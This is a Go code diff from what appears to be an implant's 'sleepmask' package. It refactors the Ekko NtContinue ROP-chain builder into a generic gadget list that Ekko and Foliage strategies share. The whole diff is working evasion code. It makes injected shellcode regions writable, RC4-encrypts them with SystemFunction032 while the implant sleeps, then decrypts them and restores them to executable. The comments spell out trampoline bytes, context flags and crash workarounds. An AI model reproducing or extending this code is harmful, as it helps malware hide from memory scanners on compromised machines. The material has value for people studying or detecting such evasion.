@@ -177,25 +177,50 @@ func (l *ekkoLayout) shadowRsp(i int) uintptr {
 	return l.scratch + ekkoShadowOffset + uintptr(i)*ekkoShadowStride + 8
 }
 
-// buildChain writes the 6 trampolines, populates the slot table, copies
-// the key into scratch, lays out the USTR pool, and fills the 6 gadget
-// contexts. ctxMain must already be populated (RtlCaptureContext'd)
-// before calling this.
-func (l *ekkoLayout) buildChain(region Region, key []byte, d time.Duration, hDummy windows.Handle, origProtectPtr *uint32) error {
+// contextControlInteger limits NtContinue to Rip/Rsp/Rbp/segments + GPRs
+// (no FP/XSAVE), so a pool thread doesn't inherit the main thread's FXSAVE
+// area — that caused crashes during the Ekko debug bring-up.
+const contextControlInteger = 0x00100003 // AMD64 | CONTROL | INTEGER
+
+// chainGadget declares one gadget in the NtContinue ROP chain: the Rip
+// to jump to and a closure that sets Rcx/Rdx/R8/R9 (nil for gadgets with
+// no register args, e.g. resumeStub).
+type chainGadget struct {
+	rip  uintptr
+	tune func(c *api.Context64)
+}
+
+// buildChain is the generic ROP-chain assembler shared by EkkoStrategy
+// (6 gadgets) and FoliageStrategy (7). It:
+//
+//   - writes N trampolines (MOVQ slot[i](RIP),CX; MOVQ $NtContinue,AX; JMP AX)
+//   - populates the slot table with &ctxs[i]
+//   - copies key into scratch, lays out dataUSTR + keyUSTR for SF032
+//   - clones ctxMain into each ctxs[i] with CONTEXT_CONTROL|INTEGER flags
+//     and patches Rip/Rsp; chains gadget N's return address into
+//     trampoline N+1, except the last gadget whose return slot is zeroed
+//     (it must never return — typically resumeStub)
+//
+// ctxMain must already be populated (RtlCaptureContext'd) before calling.
+//
+// USTR layout is the `USTRING { ULONG Length; ULONG MaximumLength; PVOID
+// Buffer; }` expected by advapi32!SystemFunction032 — NOT the USHORT-based
+// UNICODE_STRING layout.
+func (l *ekkoLayout) buildChain(gadgets []chainGadget, region Region, key []byte) error {
+	n := len(gadgets)
+	if n < 2 || n > ekkoMaxGadgets {
+		return fmt.Errorf("sleepmask/chain: gadget count %d out of range [2, %d]", n, ekkoMaxGadgets)
+	}
 	if region.Size > 0xFFFFFFFF {
-		return fmt.Errorf("sleepmask/ekko: region size %d exceeds USTRING.Length max (4 GiB)", region.Size)
+		return fmt.Errorf("sleepmask/chain: region size %d exceeds USTRING.Length max (4 GiB)", region.Size)
 	}
 	if len(key) > ekkoKeyCopyMax {
-		return fmt.Errorf("sleepmask/ekko: key size %d exceeds scratch key-copy slot %d", len(key), ekkoKeyCopyMax)
+		return fmt.Errorf("sleepmask/chain: key size %d exceeds scratch slot %d", len(key), ekkoKeyCopyMax)
 	}
 
 	ntContinueAddr := api.ProcNtContinue.Addr()
 
-	// Trampolines: each is 48 bytes of raw x64:
-	//   MOVQ ctxSlot[i](RIP), CX   48 8B 0D rel32
-	//   MOVQ $NtContinue, AX       48 B8 imm64
-	//   JMP  AX                    FF E0
-	for i := 0; i < 6; i++ {
+	for i := 0; i < n; i++ {
 		tr := l.tramp(i)
 		b := unsafe.Slice((*byte)(unsafe.Pointer(tr)), ekkoTrampStride)
 		b[0] = 0x48
@@ -211,100 +236,77 @@ func (l *ekkoLayout) buildChain(region Region, key []byte, d time.Duration, hDum
 		b[18] = 0xE0
 	}
 
-	// Slot table: slots[i] is the address of the CONTEXT the trampoline
-	// loads into RCX for NtContinue.
-	slots := unsafe.Slice((*uintptr)(unsafe.Pointer(l.slotsBase())), 6)
-	for i := 0; i < 6; i++ {
+	slots := unsafe.Slice((*uintptr)(unsafe.Pointer(l.slotsBase())), n)
+	for i := 0; i < n; i++ {
 		slots[i] = uintptr(unsafe.Pointer(l.ctxs[i]))
 	}
 
-	// Copy the key into scratch so its address is stable (not on the Go
-	// heap where GC could conceivably touch it; certainly not on a
-	// goroutine stack that could move).
 	keyBuf := unsafe.Slice((*byte)(unsafe.Pointer(l.keyCopy())), len(key))
 	copy(keyBuf, key)
 
-	// USTRING-shaped args for SystemFunction032.
-	//   typedef struct _USTRING {
-	//       ULONG  Length;        // NOT USHORT — this is USTRING, not UNICODE_STRING
-	//       ULONG  MaximumLength;
-	//       PVOID  Buffer;
-	//   } USTRING;
-	// Shared between encrypt and decrypt (RC4 is self-inverse; same data+key).
 	writeUSTR := func(at uintptr, length uint32, buf uintptr) {
 		*(*uint32)(unsafe.Pointer(at)) = length
 		*(*uint32)(unsafe.Pointer(at + 4)) = length
 		*(*uintptr)(unsafe.Pointer(at + 8)) = buf
 	}
-	dataUSTR := l.ustrDataPool()
-	keyUSTR := l.ustrKeyPool()
-	writeUSTR(dataUSTR, uint32(region.Size), region.Addr)
-	writeUSTR(keyUSTR, uint32(len(key)), l.keyCopy())
+	writeUSTR(l.ustrDataPool(), uint32(region.Size), region.Addr)
+	writeUSTR(l.ustrKeyPool(), uint32(len(key)), l.keyCopy())
 
-	// setGadget: clone ctxMain into ctxs[i], patch Rip + Rsp + return hook.
-	// ContextFlags forced to CONTEXT_CONTROL | CONTEXT_INTEGER (no FP/XSAVE)
-	// so NtContinue does not try to restore the main thread's FXSAVE area
-	// onto a pool thread with its own FPU state.
-	const contextControlInteger = 0x00100003 // AMD64 | CONTROL | INTEGER
-	setGadget := func(i int, rip uintptr, retTramp uintptr) *api.Context64 {
+	for i, g := range gadgets {
 		c := l.ctxs[i]
 		*c = *l.ctxMain
 		c.ContextFlags = contextControlInteger
-		c.Rip = uint64(rip)
+		c.Rip = uint64(g.rip)
 		rsp := l.shadowRsp(i)
-		*(*uintptr)(unsafe.Pointer(rsp)) = retTramp
+		if i == n-1 {
+			// Last gadget never returns (resumeStub SetEvents + spins).
+			*(*uintptr)(unsafe.Pointer(rsp)) = 0
+		} else {
+			*(*uintptr)(unsafe.Pointer(rsp)) = l.tramp(i + 1)
+		}
 		c.Rsp = uint64(rsp)
-		return c
+		if g.tune != nil {
+			g.tune(c)
+		}
 	}
 
-	// Gadget 0: VirtualProtect(addr, size, PAGE_READWRITE, &origProtect)
-	c := setGadget(0, api.ProcVirtualProtect.Addr(), l.tramp(1))
-	c.Rcx = uint64(region.Addr)
-	c.Rdx = uint64(region.Size)
-	c.R8 = uint64(windows.PAGE_READWRITE)
-	c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
-
-	// Gadget 1: SystemFunction032(dataUSTR, keyUSTR) — RC4 encrypt in place
-	c = setGadget(1, api.ProcSystemFunction032.Addr(), l.tramp(2))
-	c.Rcx = uint64(dataUSTR)
-	c.Rdx = uint64(keyUSTR)
-
-	// Gadget 2: WaitForSingleObjectEx(hDummy, d_ms, FALSE) — the real sleep
-	c = setGadget(2, api.ProcWaitForSingleObjectEx.Addr(), l.tramp(3))
-	c.Rcx = uint64(hDummy)
-	c.Rdx = uint64(d / time.Millisecond)
-	c.R8 = 0
-
-	// Gadget 3: SystemFunction032 — RC4 decrypt (same args; self-inverse)
-	c = setGadget(3, api.ProcSystemFunction032.Addr(), l.tramp(4))
-	c.Rcx = uint64(dataUSTR)
-	c.Rdx = uint64(keyUSTR)
-
-	// Gadget 4: VirtualProtect(addr, size, PAGE_EXECUTE_READ, &tmp).
-	// R8 is the NEW protection and is passed by value — we can't read it
-	// from origProtect* at chain-run time (that value is produced by
-	// gadget 0). We hard-code PAGE_EXECUTE_READ, which is the assumed
-	// post-inject state of shellcode regions. Callers whose regions are
-	// PAGE_EXECUTE_READWRITE should use TimerQueueStrategy or
-	// InlineStrategy, which preserve arbitrary original protections.
-	c = setGadget(4, api.ProcVirtualProtect.Addr(), l.tramp(5))
-	c.Rcx = uint64(region.Addr)
-	c.Rdx = uint64(region.Size)
-	c.R8 = uint64(windows.PAGE_EXECUTE_READ)
-	c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
-
-	// Gadget 5: resumeStub — SetEvent(hCompletion) + ExitThread(0).
-	// Never returns, so no return tramp needed. Rsp still must satisfy
-	// post-CALL alignment (% 16 == 8) for the asm stub's own CALLs.
-	cResume := l.ctxs[5]
-	*cResume = *l.ctxMain
-	cResume.ContextFlags = contextControlInteger
-	cResume.Rip = uint64(resumeStubAddr())
-	cResume.Rsp = uint64(l.shadowRsp(5))
-	// Leave [Rsp] as the SetEvent call's shadow-space arg for safety.
-	*(*uintptr)(unsafe.Pointer(l.shadowRsp(5))) = 0
-
 	return nil
+}
+
+// ekkoGadgets returns the 6-gadget list for the classic Ekko chain:
+// VirtualProtect(RW) → SF032 encrypt → WFSE wait → SF032 decrypt →
+// VirtualProtect(RX) → resumeStub. PAGE_EXECUTE_READ is hardcoded for the
+// restore because gadget 4's R8 must be known at chain-build time — it's
+// a by-value arg, not read from origProtectPtr at chain-run time.
+func ekkoGadgets(l *ekkoLayout, region Region, d time.Duration, hDummy windows.Handle, origProtectPtr *uint32) []chainGadget {
+	return []chainGadget{
+		{rip: api.ProcVirtualProtect.Addr(), tune: func(c *api.Context64) {
+			c.Rcx = uint64(region.Addr)
+			c.Rdx = uint64(region.Size)
+			c.R8 = uint64(windows.PAGE_READWRITE)
+			c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
+		}},
+		{rip: api.ProcSystemFunction032.Addr(), tune: func(c *api.Context64) {
+			c.Rcx = uint64(l.ustrDataPool())
+			c.Rdx = uint64(l.ustrKeyPool())
+		}},
+		{rip: api.ProcWaitForSingleObjectEx.Addr(), tune: func(c *api.Context64) {
+			c.Rcx = uint64(hDummy)
+			c.Rdx = uint64(d / time.Millisecond)
+			c.R8 = 0
+		}},
+		{rip: api.ProcSystemFunction032.Addr(), tune: func(c *api.Context64) {
+			c.Rcx = uint64(l.ustrDataPool())
+			c.Rdx = uint64(l.ustrKeyPool())
+		}},
+		{rip: api.ProcVirtualProtect.Addr(), tune: func(c *api.Context64) {
+			c.Rcx = uint64(region.Addr)
+			c.Rdx = uint64(region.Size)
+			c.R8 = uint64(windows.PAGE_EXECUTE_READ)
+			c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
+		}},
+		{rip: resumeStubAddr(), tune: nil},
+	}
 }
 
 // resumeStubAddr returns the entry PC of the plan9 asm resumeStub. For
@@ -356,7 +358,7 @@ func (s *EkkoStrategy) Cycle(ctx context.Context, regions []Region, cipher Ciphe
 	api.ProcRtlCaptureContext.Call(uintptr(unsafe.Pointer(layout.ctxMain)))
 
 	var origProtect uint32
-	if err := layout.buildChain(region, key, d, hDummy, &origProtect); err != nil {
+	if err := layout.buildChain(ekkoGadgets(layout, region, d, hDummy, &origProtect), region, key); err != nil {
 		return err
 	}
 
